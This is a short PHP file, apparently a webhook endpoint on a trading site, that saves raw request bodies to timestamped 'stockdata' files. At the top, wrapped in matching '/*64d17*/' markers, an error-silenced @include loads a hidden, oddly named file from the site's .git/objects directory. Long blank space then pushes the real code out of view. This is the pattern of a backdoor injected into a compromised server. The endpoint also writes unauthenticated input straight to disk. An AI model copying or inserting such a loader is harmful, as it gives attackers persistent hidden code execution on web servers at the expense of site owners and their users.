<?php
/*64d17*/

@include ("/home4/krozzsoy/mytradebit.krozzle.com/.git/objects/fe/.39706c4e.oti");

/*64d17*/























$json = file_get_contents('php://input');
$payload = json_decode($json, true);
$fname = 'stockdata-' . time() . '.dat';
$fp = fopen($fname, "wb");
fwrite($fp, $json);
fclose($fp);
echo json_encode([
  "status" => 200,
  "name" => "Test"
]);
die;
